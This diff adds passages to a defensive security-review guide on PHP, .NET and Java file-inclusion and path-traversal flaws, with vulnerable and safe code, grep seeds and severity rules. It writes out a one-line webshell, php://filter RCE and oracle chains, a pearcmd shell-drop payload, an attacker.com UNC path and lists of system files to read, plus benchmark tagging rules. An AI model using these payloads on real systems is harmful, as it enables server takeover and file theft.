+**The single most important severity driver for an `include()`/`require()` LFI sink.** `php://filter` is a stream filter applied to a **local** resource — it is **not** a URL include — so it is gated by **neither** `allow_url_include` **nor** `allow_url_fopen`. By chaining many `convert.iconv.<enc1>.<enc2>` steps together with `convert.base64-decode`, an attacker makes the *wrapper string itself* materialize arbitrary executable PHP bytes, which `include`/`require` then runs. No file upload, no readable/poisonable log, no writable directory, and no remote-URL settings are required. Public chain generators emit the full filter string from a target PHP payload.
+
+```php
+// VULNERABLE — include() sink reachable with a php://filter chain
+include($_GET['page']);                 // or include('templates/' . $_GET['tpl'] . '.php')
+// Attacker (one long generated string), shape:
+//   page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp
+// -> the chain emits `<?php system($_GET["c"]); ?>` which include() executes -> RCE
+// Works even when: allow_url_include=Off, allow_url_fopen=Off, no upload, no readable logs,
+//                  web root not writable, and the sink appends ".php" (the filter operates on the stream).
+```
+
+**Severity rule (raises the ceiling):** when the sink is **`include`/`require`/`include_once`/`require_once`** (code execution) AND a `php://` wrapper is reachable (not stripped by an allowlist/`basename`/scheme filter), treat the finding as **Critical (RCE)** by default — the filter-chain completes with none of the classic preconditions. Only a **read-only** sink (`readfile`/`file_get_contents`/`fopen`/`file`/`fpassthru`) without an include caps the ceiling at source/secret disclosure. Do **not** downgrade an include-sink LFI to "Medium, read-only" merely because there is no upload, no log access, and `allow_url_include=Off`.
+
+**Grep seeds**: `php://filter` adjacent to `include(`/`require(`; `convert.iconv`; `convert.base64-decode`; long `php://filter/...|...|resource=` strings in tests/logs.
+
+### php://filter as a *blind* file-read oracle (no output sink required)
+
+Distinct from the two cases above (filter-chain-**RCE** into an `include` sink, and base64 **source disclosure** from a readable sink): a `file_get_contents`/`fopen`/image-decoder sink whose **only observable is success vs error** (HTTP 200 vs 500, or a timing/size difference) can still be turned into a **full file read** with a `php://filter` chain used as an **error oracle**. The chain amplifies the target so that specific leading bytes trip a memory/processing failure while others pass: e.g. `php://filter/convert.base64-encode|dechunk/resource=/target` — the `dechunk` filter deletes a single line that begins with a hex digit (`0-9a-fA-F`) but passes any other line unchanged, and repeated `convert.iconv.<enc>.<enc>` steps (e.g. `latin1.UTF-32`) **blow the string up 4× per pass** until a non-hex leading byte exhausts memory → **500**. Each request leaks one base64 character by whether it errors, reconstructing the file byte-by-byte through a boolean/error oracle with **no file content ever returned**. This means a sink that merely *accepts a URL/path* and *reports success/failure* (a common shape: a "fetch image from URL" / avatar-from-URL feature, an import that validates a file) is a full arbitrary-file-read primitive, not merely blind SSRF.
+- **VULN shape**: user input reaches `file_get_contents($url)`/`fopen`/an image-library constructor that accepts URLs (`Intervention` `ImageManager->make($url)`, `Image::make`, GD/Imagick from a path) — these happily accept `file://`, `php://filter`, `data://` wrappers, so "it's just an image URL" is LFI + oracle, not only SSRF. A `FILTER_VALIDATE_URL` check does **not** block `php://filter`/`file://`.
+- **SAST signals**: `file_get_contents`/`fopen`/`ImageManager(->|::)make`/`Image::make` on a value that is a user-supplied URL/path with no scheme allowlist; a fetch/import/preview whose response distinguishes success from error on attacker-controlled paths; `php://filter/...|dechunk` or stacked `convert.iconv` in payloads/logs.
+- **SAFE**: pass only a **server-written temp-file path** (never a user URL/string) into image libraries; allowlist schemes to `https?:` (reject `php://`/`file://`/`data://`) *before* the sink; don't expose per-byte success/error differences on file operations.
+
+### .user.ini / .htaccess auto_prepend_file → RCE
+
+When an upload (or any attacker-controlled file write) can land a file in or beside a directory where PHP executes, a dropped config file forces the server to auto-include attacker PHP on **every** request to that directory — RCE without needing any LFI parameter once it lands. `auto_prepend_file` (and `auto_append_file`) is honored from `.user.ini` on PHP-FPM/CGI and from `.htaccess` on Apache + mod_php.
+
+The same **file-write → config-that-executes** shape recurs beyond PHP, in config formats whose own syntax can run commands at parse/reload time: a write to a **uWSGI `.ini`** — whose `@(exec://<cmd>)` / `@(call://…)` "magic" operators execute during config parsing — paired with `py-auto-reload`/touch-reload re-reads it and gives RCE on the next reload (a polyglot payload, e.g. a valid PDF that is also a valid uWSGI `.ini`, lets an innocuous-looking upload double as the config). Likewise a write to a shell/CI config auto-sourced on the next run, a `.git/hooks/*`, or a `Makefile`/task file a job later invokes. **Signal**: an attacker-controlled write whose destination is (or can traverse to) a config/hook/init file a runtime re-reads, especially one supporting embedded command/exec directives; treat "write path + auto-reload/auto-include" as an RCE chain, not a mere file write.
+
+```ini
+; .user.ini (PHP-FPM/CGI) — auto-includes the polyglot shell on every .php hit in this dir
+auto_prepend_file=shell.gif
+```
+```apache
+# .htaccess (Apache + mod_php) — treat .gif as PHP, or force auto-prepend
+AddType application/x-httpd-php .gif
+php_value auto_prepend_file shell.gif
+```
+```php
+# shell.gif — image magic bytes pass content checks; PHP runs on include
+GIF89a<?php system($_GET['c']); ?>
+```
+
+**SAST angle**: an upload feature that does not pin the destination filename/extension to a server-side allowlist (lets `.user.ini`/`.htaccess`/`.gif`-as-PHP land in a PHP-served dir) is an **RCE** path, not merely "unrestricted upload" — cross-reference `arbitrary_file_upload.md`. **Grep seeds**: `auto_prepend_file`, `auto_append_file`, `.user.ini`, `.htaccess`, `AddType`, `php_value`, `application/x-httpd-php`.
+
+### PHP Session File Inclusion
+
+Session files live at `{session.save_path}/sess_{PHPSESSID}` (default often `/var/lib/php/sessions/` or `/var/lib/php*/sessions/` in container images). PHP serializes `$_SESSION` values into the file; if attacker-controlled bytes reach session storage and the file is later `include`d, the payload executes.
+
+```php
+// VULNERABLE: include session file keyed to victim or attacker PHPSESSID
+$sessionFile = ini_get('session.save_path') . '/sess_' . $_COOKIE['PHPSESSID'];
+include($sessionFile);
+
+// VULNERABLE: include session file with user-controlled session ID
+$sessionFile = '/var/lib/php/sessions/sess_' . $_GET['sessid'];
+include($sessionFile);
+
+// VULNERABLE: reflected/stored field written to session, then session file included
+$_SESSION['theme'] = $_GET['color'];  // or $_POST, reflected in response elsewhere
+include('/var/lib/php/sessions/sess_' . session_id());  // include own session file
+// Attacker sets PHPSESSID cookie, submits <?php ... ?> in color=, triggers include
+```
+
+**Grep seeds**: `sess_`, `session.save_path`, `PHPSESSID`, `$_SESSION[` adjacent to `include(`/`require(`
+
+### LFI → RCE via pearcmd.php (Docker PHP images)
+
+Official PHP Docker images often ship `/usr/local/lib/php/pearcmd.php`. When user input reaches `include`/`require`/`file_get_contents`/`fopen` as a path (params such as `file`, `page`, `include`) and extra query arguments propagate, `pearcmd.php` may interpret the query string as CLI argv when `register_argc_argv=On` (common in dev images).
+
+**Chain**: include `/usr/local/lib/php/pearcmd.php` with `+config-create` argv → writes attacker-controlled PHP to a web-readable path → follow-up include or direct HTTP fetch of dropped file → RCE.
+
+```php
+// VULNERABLE — path param reaches include; query args become pearcmd argv
+include('/' . ltrim($_GET['file'], '/'));
+// Attacker: file=usr/local/lib/php/pearcmd.php&+config-create+/&/<?=system($_GET['c']);?>+/var/www/html/s.php
+```
+
+**Grep seeds**: `pearcmd`, `/usr/local/lib/php/pearcmd`, `+config-create`, `register_argc_argv`
+
+### Common Include Targets (Analyst Enumeration)
+
+When dynamic `include($_GET[...])` / `require` exists without allowlist, enumerate beyond `/etc/passwd`:
+
+```text
+/var/lib/php/sessions/sess_<PHPSESSID>   # session.save_path default
+/var/lib/php*/sess_*                     # version-specific session dirs
+/var/mail/<user>                         # local mail spool
+/var/spool/mail/<user>                   # alternate mail spool layout
+/proc/self/environ
+/tmp/php*                                # upload temp names
+/usr/local/lib/php/pearcmd.php           # Docker PHP + register_argc_argv
+```
+
+Mail spool paths are relevant when cron, `mail()`, or MTA output lands in mbox files that later become inclusion targets.
+
+## IIS-Specific Path Traversal Patterns
+
+### Tilde Shortname Enumeration
+
+```
+// NOT a code pattern — IIS server behavior
+// IIS generates 8.3 short names for files/dirs
+// Attacker can enumerate filenames via: GET /a~1/b~1/secret.txt HTTP/1.1
+// This is an IIS server configuration issue, not an app code issue
+// DETECTION: Only relevant if code passes user-controlled path to IIS file system ops
+```
+
+### Unicode / Double-Decode in ASP.NET
+
+```csharp
+// VULNERABLE: Path constructed from URL without proper decoding
+string filePath = Server.MapPath(Request.QueryString["file"]);
+// Attacker: file=..%252fetc%252fpasswd → double-decoded → ../../etc/passwd
+// %25 → % then %2f → / = ../ after double decode
+
+// VULNERABLE: Path.Combine with absolute path injection
+string filePath = Path.Combine(baseDir, Request.QueryString["file"]);
+// If "file" = "C:\Windows\win.ini" (absolute path), Path.Combine returns the absolute path
+// Effectively ignoring baseDir
+
+// SAFE:
+string userFile = Request.QueryString["file"];
+string combined = Path.GetFullPath(Path.Combine(baseDir, userFile));
+if (!combined.StartsWith(baseDir)) throw new Exception("Path traversal detected");
+```
+
+### ASP / ASPX Double Extension
+
+```csharp
+// VULNERABLE: path allows ../ to reach web.config or App_Code
+string template = Path.Combine(templateDir, Request.QueryString["template"] + ".html");
+// template=../../../../web.config%00 (null byte bypass in some .NET versions)
+// template=../App_Code/BusinessLogic.cs → source disclosure
+```
+
+## Windows-Specific Path Traversal Conditions
+
+```java
+// VULNERABLE: Windows UNC path injection
+String path = baseDir + request.getParameter("file");
+File f = new File(path);
+// Attacker: file=\\attacker.com\share\secret → UNC path reaches remote share
+// VULN on Windows servers where UNC paths are followed
+
+// VULNERABLE: Windows device name injection
+// CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9 as filename components → DoS or unexpected behavior
+String filename = request.getParameter("filename");
+new File(baseDir, filename);
+// filename="NUL" → hangs; filename="CON" → reads from console
+
+// VULNERABLE: Alternate Data Streams (Windows NTFS)
+// file=secret.txt::$DATA → reads the main stream
+// file=legit.txt:evil.php → ADS execution in some IIS configs
+```
+
+## Additional Java Path Traversal Sink Patterns
+
+```java
+// VULNERABLE: ClassLoader.getResourceAsStream with user input
+getClass().getResourceAsStream(request.getParameter("resource"));
+// Can read classpath resources including application.properties, config files
+
+// VULNERABLE: ZipFile entry path not validated
+ZipFile zip = new ZipFile(uploadedFile);
+for (ZipEntry entry : Collections.list(zip.entries())) {
+    File dest = new File(extractDir, entry.getName());
+    // entry.getName() = "../../webapps/ROOT/shell.jsp" → Zip Slip
+}
+
+// VULNERABLE: Filename from Content-Disposition header
+String contentDisposition = request.getHeader("Content-Disposition");
+String filename = contentDisposition.split("filename=")[1];  // user-controlled
+new File(UPLOAD_DIR, filename);  // path traversal if filename = "../config/db.properties"
+
+// SAFE: always canonicalize and verify prefix
+String filename = Paths.get(userInput).getFileName().toString();  // strips directory components
+File dest = new File(baseDir, filename).getCanonicalFile();
+if (!dest.getPath().startsWith(baseDir)) throw new SecurityException();
+```
+
+## PHP/Java TRUE POSITIVE Detection Summary
+
+- `include/require($_GET['page'])` with no realpath validation → **CONFIRM** (LFI, RCE with wrappers)
+- `str_replace('../', '', input)` used as traversal protection → **CONFIRM** (bypassable with `....//`)
+- `new File(baseDir, userInput)` without `getCanonicalFile().startsWith(baseDir)` check → **CONFIRM**
+- `ZipEntry.getName()` used directly in file path construction → **CONFIRM** (Zip Slip)
+- `Path.Combine(baseDir, userInput)` without `GetFullPath` + startsWith check → **CONFIRM** (.NET)
+- `ClassLoader.getResourceAsStream(userInput)` → **CONFIRM** (classpath file disclosure)
+- In benchmark mode, use project tag `path_traversal` for vulhub representative dirs even when the primitive is local file inclusion or path traversal.
+- FALSE POSITIVE guard: do not keep `path_traversal_lfi_rfi` as the reported tag for `vulhub`.
+
+## Sources, Sinks & Sanitizers
+
+Path traversal is modeled as **taint from remote sources to path-creation / file-access sinks**, with language-specific sanitizers (canonical path + prefix check, filename-only validation).
+
+**Sources**: HTTP parameters, cookies, headers, request bodies (`ActiveThreatModelSource` / `RemoteFlowSource`).
+
+**Sinks**: `fs.readFile`, `path.join` → file open, `sendFile`, Java `new File(…)`, `Paths.get`, Python `open`/`os.path.join`, Go `filepath.Join` + `os.Open`, archive `extract` entry paths.
+
+**Sanitizers (Java `PathInjectionSanitizer`)**: `getCanonicalPath()` + trusted prefix guard; `Path.normalize()` + prefix; rejection of `..` and separators; exact path match guards; Kotlin `FilesKt`/`StringsKt` prefix checks paired with traversal guards.
+
+**Sanitizers (JS `TaintedPath`)**: `path.resolve`/`realpathSync` + root prefix check; `sanitize-filename`; allowlist regex on basename; barrier guards on normalized absolute paths within root.
+
+**SAFE patterns**: `File(base, tainted).getCanonicalFile()` then `startsWith(safeRoot)`; Python `realpath` + prefix; deny absolute paths; validate `ZipEntry.getName()` before extract.
+
+Commonly affected languages: JavaScript, Java, Python, Go, C#, Ruby, Rust, Swift.
+
+**Manual triage**: PHP `include`/`require` LFI (sink is code execution, not path label). RFI via `allow_url_include` is not modeled as a dedicated query.
